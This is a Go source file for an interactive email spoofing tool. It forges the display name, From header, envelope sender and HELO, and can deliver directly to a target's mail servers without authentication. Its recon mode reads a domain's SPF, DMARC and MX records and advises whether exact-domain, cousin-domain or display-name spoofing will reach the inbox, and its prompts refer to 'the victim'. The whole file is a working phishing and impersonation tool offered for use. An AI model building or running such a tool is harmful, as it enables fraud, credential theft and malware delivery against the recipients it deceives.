package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"log"
	"net"
	"net/smtp"
	"os"
	"path/filepath"
	"strings"

	prompt "github.com/c-bata/go-prompt"
)

// ASCII Art
const asciiArt = `

   ▄████  ▒█████      ███▄ ▄███▓ ▄▄▄       ██▓ ██▓    ▓█████  ██▀███
   ██▒ ▀█▒▒██▒  ██▒   ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    ▓█   ▀ ▓██ ▒ ██▒
   ▒██░▄▄▄░▒██░  ██▒   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    ▒███   ▓██ ░▄█ ▒
   ░▓█  ██▓▒██   ██░   ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░    ▒▓█  ▄ ▒██▀▀█▄
   ░▒▓███▀▒░ ████▓▒░   ▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒░▒████▒░██▓ ▒██▒
   ░▒   ▒ ░ ▒░▒░▒░    ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
    ░   ░   ░ ▒ ▒░    ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
   ░ ░   ░ ░ ░ ░ ▒     ░      ░     ░   ▒    ▒ ░  ░ ░      ░     ░░   ░
        ░     ░ ░            ░         ░  ░ ░      ░  ░   ░  ░   ░    

`
const headerArt = `

░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░       ░▒▓███████▓▒░       ░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒▒▓█▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░        ░▒▓██████▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ 
  ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░ 
  ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓██▓▒░▒▓█▓▒░░▒▓█▓▒░ 
   ░▒▓██▓▒░  ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓██▓▒░▒▓████████▓▒░ 
        

`

func completer(d prompt.Document) []prompt.Suggest {
	suggestions := []prompt.Suggest{
		{Text: "sendEmail", Description: "Send an email"},
		{Text: "quit", Description: "Exit the program"},
	}
	return prompt.FilterHasPrefix(suggestions, d.GetWordBeforeCursor(), true)
}

// File path autocompletion
func filePathCompleter(d prompt.Document) []prompt.Suggest {
	word := d.GetWordBeforeCursor()
	if word == "" {
		return []prompt.Suggest{}
	}
	dir, file := filepath.Split(word)
	matches, _ := filepath.Glob(filepath.Join(dir, file+"*"))
	suggestions := []prompt.Suggest{}
	for _, match := range matches {
		suggestions = append(suggestions, prompt.Suggest{Text: match})
	}
	return prompt.FilterHasPrefix(suggestions, word, true)
}

// Read SMTP configuration from a file (relay mode only)
func readConfig(fileName string) (map[string]string, error) {
	config := make(map[string]string)
	file, err := os.Open(fileName)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.TrimSpace(line) == "" || strings.HasPrefix(strings.TrimSpace(line), "[") {
			continue // skip blanks and the [SMTP] section header
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) == 2 {
			config[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return config, nil
}

// Create email message
func createEmail(fromName, fromEmail, toEmail, ccNames, ccEmails, subject, body, imageBase64, attachmentBase64, attachmentName string) string {
	var buffer bytes.Buffer
	boundary := "boundary"
	buffer.WriteString(fmt.Sprintf("Subject: %s\r\n", subject))
	buffer.WriteString(fmt.Sprintf("From: %s <%s>\r\n", fromName, fromEmail))
	buffer.WriteString(fmt.Sprintf("To: <%s>\r\n", toEmail))
	if ccEmails != "" {
		ccNamesEmails := strings.Split(ccEmails, ",")
		ccNamesList := strings.Split(ccNames, ",")
		for i := range ccNamesEmails {
			name := ""
			if i < len(ccNamesList) {
				name = ccNamesList[i]
			}
			buffer.WriteString(fmt.Sprintf("Cc: %s <%s>\r\n", name, ccNamesEmails[i]))
		}
	}
	buffer.WriteString("MIME-Version: 1.0\r\n")
	buffer.WriteString(fmt.Sprintf("Content-Type: multipart/related; boundary=\"%s\"\r\n", boundary))
	buffer.WriteString("\r\n")
	buffer.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	buffer.WriteString("Content-Type: text/html; charset=\"UTF-8\"\r\n")
	buffer.WriteString("\r\n")
	buffer.WriteString(fmt.Sprintf("<html>\r\n<body>\r\n<p>%s</p>\r\n", strings.ReplaceAll(body, "\n", "<br>")))
	if imageBase64 != "" {
		buffer.WriteString(`<img src=cid:image1 alt="Inline Image" style="width:100%;max-width:600px;">`)
	}
	buffer.WriteString("\r\n</body>\r\n</html>\r\n")
	buffer.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	if imageBase64 != "" {
		buffer.WriteString("Content-Type: image/jpeg; name=\"image.jpg\"\r\n")
		buffer.WriteString("Content-Disposition: inline; filename=\"image.jpg\"\r\n")
		buffer.WriteString("Content-ID: <image1>\r\n")
		buffer.WriteString("Content-Transfer-Encoding: base64\r\n")
		buffer.WriteString("\r\n")
		buffer.WriteString(fmt.Sprintf("%s\r\n", imageBase64))
		buffer.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	}
	if attachmentBase64 != "" {
		buffer.WriteString("Content-Type: application/octet-stream; name=\"" + attachmentName + "\"\r\n")
		buffer.WriteString("Content-Disposition: attachment; filename=\"" + attachmentName + "\"\r\n")
		buffer.WriteString("Content-Transfer-Encoding: base64\r\n")
		buffer.WriteString("\r\n")
		buffer.WriteString(fmt.Sprintf("%s\r\n", attachmentBase64))
		buffer.WriteString(fmt.Sprintf("--%s--\r\n", boundary))
	} else {
		buffer.WriteString(fmt.Sprintf("--%s--\r\n", boundary))
	}
	return buffer.String()
}

// Prompt for a Y/N question with error handling
func promptYesNo(question string) string {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(question)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(strings.ToUpper(input))
		if input == "Y" || input == "N" {
			return input
		}
		fmt.Println("Invalid input. Please enter Y or N.")
	}
}

// parseDMARCPolicy pulls the p= tag out of a DMARC record.
func parseDMARCPolicy(record string) string {
	for _, part := range strings.Split(record, ";") {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(part, "p=") {
			return strings.TrimPrefix(part, "p=")
		}
	}
	return "unknown"
}

// checkDomain reports SPF / DMARC / MX posture for a target domain so you can
// decide between exact-domain spoof, cousin domain, or display-name spoof.
func checkDomain(domain string) {
	fmt.Printf("\n=== Recon: %s ===\n", domain)

	// MX
	mxs, err := net.LookupMX(domain)
	if err != nil || len(mxs) == 0 {
		fmt.Printf("MX:    none found (%v)\n", err)
	} else {
		fmt.Println("MX:")
		for _, mx := range mxs {
			fmt.Printf("       %3d  %s\n", mx.Pref, strings.TrimSuffix(mx.Host, "."))
		}
	}

	// SPF
	spf := ""
	if txts, _ := net.LookupTXT(domain); txts != nil {
		for _, t := range txts {
			if strings.HasPrefix(strings.ToLower(t), "v=spf1") {
				spf = t
			}
		}
	}
	if spf == "" {
		fmt.Println("SPF:   none")
	} else {
		fmt.Printf("SPF:   %s\n", spf)
	}

	// DMARC
	dmarc := ""
	if dtxts, _ := net.LookupTXT("_dmarc." + domain); dtxts != nil {
		for _, t := range dtxts {
			if strings.HasPrefix(strings.ToLower(t), "v=dmarc1") {
				dmarc = t
			}
		}
	}
	if dmarc == "" {
		fmt.Println("DMARC: none  --> exact-domain spoofing likely VIABLE (no policy published)")
	} else {
		fmt.Printf("DMARC: %s\n", dmarc)
		switch strings.ToLower(parseDMARCPolicy(dmarc)) {
		case "reject":
			fmt.Println("       p=reject     --> exact-domain spoof will be REJECTED. Use cousin domain / display-name.")
		case "quarantine":
			fmt.Println("       p=quarantine --> exact-domain spoof lands in JUNK. Cousin domain recommended.")
		case "none":
			fmt.Println("       p=none       --> monitored only; exact-domain spoof likely lands in INBOX.")
		default:
			fmt.Println("       (could not parse policy tag)")
		}
	}
	fmt.Println()
}

// deliver speaks SMTP directly to one MX host. No auth — envelope and headers
// are whatever you pass in.
func deliver(host, envelopeFrom, heloName string, recipients []string, msg []byte) error {
	c, err := smtp.Dial(host + ":25")
	if err != nil {
		return err
	}
	defer c.Close()

	if heloName == "" {
		heloName = "mail.example.com"
	}
	if err := c.Hello(heloName); err != nil {
		return fmt.Errorf("HELO/EHLO: %w", err)
	}

	// Opportunistic STARTTLS. Skip verify: we're connecting to arbitrary MXs
	// and just want the channel encrypted, not the cert chain validated.
	if ok, _ := c.Extension("STARTTLS"); ok {
		tlsCfg := &tls.Config{ServerName: host, InsecureSkipVerify: true}
		if err := c.StartTLS(tlsCfg); err != nil {
			return fmt.Errorf("STARTTLS: %w", err)
		}
	}

	if err := c.Mail(envelopeFrom); err != nil {
		return fmt.Errorf("MAIL FROM <%s>: %w", envelopeFrom, err)
	}
	for _, r := range recipients {
		if err := c.Rcpt(r); err != nil {
			return fmt.Errorf("RCPT TO <%s>: %w", r, err)
		}
	}

	w, err := c.Data()
	if err != nil {
		return fmt.Errorf("DATA: %w", err)
	}
	if _, err := w.Write(msg); err != nil {
		return err
	}
	if err := w.Close(); err != nil {
		return err
	}
	return c.Quit()
}

// sendDirect resolves the recipient domain's MX records and tries them in
// priority order until one accepts the message.
func sendDirect(envelopeFrom, heloName string, recipients []string, msg []byte) error {
	if len(recipients) == 0 {
		return fmt.Errorf("no recipients")
	}
	at := strings.LastIndex(recipients[0], "@")
	if at < 0 {
		return fmt.Errorf("invalid recipient address: %s", recipients[0])
	}
	domain := recipients[0][at+1:]

	mxs, err := net.LookupMX(domain)
	if err != nil || len(mxs) == 0 {
		return fmt.Errorf("MX lookup for %s failed: %v", domain, err)
	}

	var lastErr error
	for _, mx := range mxs {
		host := strings.TrimSuffix(mx.Host, ".")
		log.Printf("Trying MX %s (pref %d)...", host, mx.Pref)
		if err := deliver(host, envelopeFrom, heloName, recipients, msg); err != nil {
			log.Printf("  %s failed: %v", host, err)
			lastErr = err
			continue
		}
		log.Printf("Delivered via %s", host)
		return nil
	}
	return fmt.Errorf("all MX hosts failed; last error: %v", lastErr)
}

func main() {
	checkFlag := flag.String("check", "", "Recon a domain's SPF/DMARC/MX posture and exit (e.g. -check targetcorp.com)")
	directFlag := flag.Bool("direct", false, "Send straight to the recipient's MX (no relay, arbitrary From)")
	configPath := flag.String("config", "config.ini", "Path to SMTP relay config (relay mode)")
	heloFlag := flag.String("helo", "", "HELO/EHLO hostname for direct mode")
	flag.Parse()

	// Recon-only and exit.
	if *checkFlag != "" {
		checkDomain(*checkFlag)
		return
	}

	fmt.Println(asciiArt)
	fmt.Println(headerArt)

	// Relay config is only needed when NOT in direct mode.
	var server, port, username, password string
	if !*directFlag {
		config, err := readConfig(*configPath)
		if err != nil {
			log.Fatalf("Error reading config file: %v", err)
		}
		server = config["server"]
		port = config["port"]
		username = config["username"]
		password = config["password"]
	} else {
		fmt.Println("[direct-to-MX mode] No relay/auth — talking to the target's mail server directly.")
	}

	dir, err := os.Getwd()
	if err != nil {
		log.Fatalf("Error getting current directory: %v", err)
	}
	fmt.Printf("Current working directory: %s\n", dir)

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter the display name (what the victim sees as From): ")
	fromName, _ := reader.ReadString('\n')
	fromName = strings.TrimSpace(fromName)

	fmt.Print("Enter the From email address (header From / spoofed): ")
	fromEmail, _ := reader.ReadString('\n')
	fromEmail = strings.TrimSpace(fromEmail)

	useSameRecipient := promptYesNo("Do you want to use the same email address for the recipient? (Y/N): ")
	var toEmail string
	if useSameRecipient == "Y" {
		toEmail = fromEmail
	} else {
		fmt.Print("Enter recipient's email address: ")
		toEmail, _ = reader.ReadString('\n')
		toEmail = strings.TrimSpace(toEmail)
	}

	addCC := promptYesNo("Do you want to CC someone? (Y/N): ")
	var ccNames, ccEmails string
	if addCC == "Y" {
		fmt.Print("Enter CC names and emails (name then email; empty name line to finish):\n")
		for {
			line, _ := reader.ReadString('\n')
			line = strings.TrimSpace(line)
			if line == "" {
				break
			}
			ccNames += line + ","
			fmt.Print("Enter corresponding CC email: ")
			email, _ := reader.ReadString('\n')
			email = strings.TrimSpace(email)
			ccEmails += email + ","
		}
		ccNames = strings.TrimSuffix(ccNames, ",")
		ccEmails = strings.TrimSuffix(ccEmails, ",")
	}

	fmt.Print("Enter the subject of the email: ")
	subject, _ := reader.ReadString('\n')
	subject = strings.TrimSpace(subject)

	fmt.Print("Enter the body of the email (type 'END' on a new line to finish):\n")
	var bodyBuilder strings.Builder
	for {
		line, _ := reader.ReadString('\n')
		line = strings.TrimSpace(line)
		if line == "END" {
			break
		}
		bodyBuilder.WriteString(line + "\n")
	}
	body := bodyBuilder.String()

	fmt.Print("Enter the path to the image file (leave empty if not needed): ")
	imagePath, _ := reader.ReadString('\n')
	imagePath = strings.TrimSpace(imagePath)
	var imageBase64 string
	if imagePath != "" {
		imageFile, err := os.ReadFile(imagePath)
		if err != nil {
			log.Fatalf("Error reading image file: %v", err)
		}
		imageBase64 = base64.StdEncoding.EncodeToString(imageFile)
	}

	fmt.Print("Enter the path to the attachment file (leave empty if not needed): ")
	attachmentPath, _ := reader.ReadString('\n')
	attachmentPath = strings.TrimSpace(attachmentPath)
	var attachmentBase64, attachmentName string
	if attachmentPath != "" {
		attachmentFile, err := os.ReadFile(attachmentPath)
		if err != nil {
			log.Fatalf("Error reading attachment file: %v", err)
		}
		attachmentBase64 = base64.StdEncoding.EncodeToString(attachmentFile)
		attachmentName = filepath.Base(attachmentPath)
	}

	emailMessage := createEmail(fromName, fromEmail, toEmail, ccNames, ccEmails, subject, body, imageBase64, attachmentBase64, attachmentName)

	// Build recipient envelope list (To + any CCs).
	recipients := []string{toEmail}
	if ccEmails != "" {
		for _, e := range strings.Split(ccEmails, ",") {
			if e = strings.TrimSpace(e); e != "" {
				recipients = append(recipients, e)
			}
		}
	}

	if *directFlag {
		// Recon the target first so you know what you're walking into.
		if at := strings.LastIndex(toEmail, "@"); at >= 0 {
			checkDomain(toEmail[at+1:])
		}

		// Envelope sender (MAIL FROM / Return-Path) can differ from the header From.
		fmt.Printf("Enter envelope-from / Return-Path [default %s]: ", fromEmail)
		envelopeFrom, _ := reader.ReadString('\n')
		envelopeFrom = strings.TrimSpace(envelopeFrom)
		if envelopeFrom == "" {
			envelopeFrom = fromEmail
		}

		// Default HELO name to the envelope-from domain unless overridden.
		helo := *heloFlag
		if helo == "" {
			if at := strings.LastIndex(envelopeFrom, "@"); at >= 0 {
				helo = envelopeFrom[at+1:]
			}
		}

		if err := sendDirect(envelopeFrom, helo, recipients, []byte(emailMessage)); err != nil {
			log.Fatalf("Error sending email (direct): %v", err)
		}
		fmt.Println("Email sent successfully (direct-to-MX)!")
		return
	}

	// Relay mode (authenticated send through Brevo/etc.)
	auth := smtp.PlainAuth("", username, password, server)
	if err := smtp.SendMail(server+":"+port, auth, fromEmail, recipients, []byte(emailMessage)); err != nil {
		log.Fatalf("Error sending email: %v", err)
	}
	fmt.Println("Email sent successfully!")
}
